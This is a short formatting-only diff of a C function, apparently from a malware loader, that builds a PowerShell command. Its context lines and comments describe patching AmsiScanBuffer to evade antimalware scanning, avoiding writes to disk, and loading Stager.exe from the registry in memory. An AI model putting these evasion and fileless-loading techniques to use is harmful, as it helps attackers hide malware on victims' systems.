@@ -55,8 +55,7 @@ LPWSTR GetPowershellCommand()
 	{
 		// Patch amsi.dll!AmsiScanBuffer prior to [Reflection.Assembly]::Load.
 		// Do not use Add-Type, because it will invoke csc.exe and compile a C# DLL to disk.
-		StrCatW
-		(
+		StrCatW(
 			command,
 			// Function to create a Delegate from an IntPtr
 			L"function Local:Get-Delegate{"
@@ -116,8 +115,7 @@ LPWSTR GetPowershellCommand()
 	}
 
 	// Load Stager.exe from registry and invoke
-	StrCatW
-	(
+	StrCatW(
 		command,
 		L"[Reflection.Assembly]::Load"
 		L"("
